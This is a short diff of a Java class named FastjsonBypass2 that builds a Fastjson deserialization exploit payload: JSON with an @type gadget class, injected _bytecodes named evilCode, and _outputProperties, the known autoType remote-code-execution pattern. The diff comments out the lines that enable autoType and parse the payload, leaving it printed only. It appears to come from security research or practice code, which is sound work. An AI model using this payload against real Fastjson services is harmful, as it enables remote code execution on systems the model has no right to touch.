@@ -19,8 +19,8 @@ public class FastjsonBypass2 {
         String poc = "{" + "\"@type\":\"" + NASTY_CLASS + "\"," + "\"_bytecodes\":[\"" + evilCode + "\"]," + "\"_name\":\"Calc\"," + "\"_tfactory\":{}," + "\"_outputProperties\":{}" + "}";
         System.out.println(poc);
 
-        ParserConfig config = new ParserConfig();
-        config.setAutoTypeSupport(true);
-        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
+//        ParserConfig config = new ParserConfig();
+//        config.setAutoTypeSupport(true);
+//        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
     }
 }
